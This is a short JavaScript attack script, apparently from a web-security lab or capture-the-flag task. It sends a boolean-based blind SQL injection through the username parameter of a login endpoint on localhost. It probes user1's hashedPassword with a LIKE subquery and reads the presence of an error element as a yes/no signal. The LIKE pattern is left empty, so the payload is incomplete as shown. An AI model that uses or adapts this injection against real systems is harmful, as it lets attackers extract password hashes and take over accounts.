
let Query = `attacker" AND (Select 1 From Users Where username=="user1" and hashedPassword LIKE ) AND "1"="1`
let response = await fetch(`http://localhost:3000/get_login?username=${Query}&password=evil`, {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "If-None-Match": "W/\"650-GiOh0r8L5oONa7AGatY1jyqkHGw\""
    },
    "referrer": "http://localhost:3000/login",
    "method": "GET",
    "mode": "cors"
}).then(response => response.text())
    .then(data => {
        console.log(data.includes("<p class='error'>"))
    })